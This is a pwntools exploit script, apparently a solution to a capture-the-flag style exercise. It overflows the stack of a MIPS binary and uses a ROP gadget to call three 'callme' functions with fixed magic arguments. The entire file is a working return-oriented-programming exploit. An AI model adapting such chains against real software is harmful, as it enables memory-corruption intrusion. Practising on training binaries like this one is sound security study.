from pwn import *
context.binary = elf = ELF('callme_mipsel')

'''
0x00400bb0: lw $a0, 0x10($sp); lw $a1, 0xc($sp); lw $a2, 8($sp); lw $t9, 4($sp); jalr $t9; nop; 
'''

u_g = 0x00400bb0
offset = 4*9

a0 = 0xdeadbeef
a1 = 0xcafebabe
a2 = 0xd00df00d 
jump1 = elf.sym['callme_one']
jump2 = elf.sym['callme_two']
jump3 = elf.sym['callme_three']

arg = p32(a2)+p32(a1)+p32(a0)

payload = b'A'*offset + p32(u_g)+p32(0x1)+p32(jump1)+arg + p32(u_g) + p32(0x1) +p32(jump2) + arg + p32(u_g) + p32(0x1) +p32(jump3) + arg

p = gdb.debug(elf.path)

p.recv()
p.sendline(payload)
log.info(p.recvall())

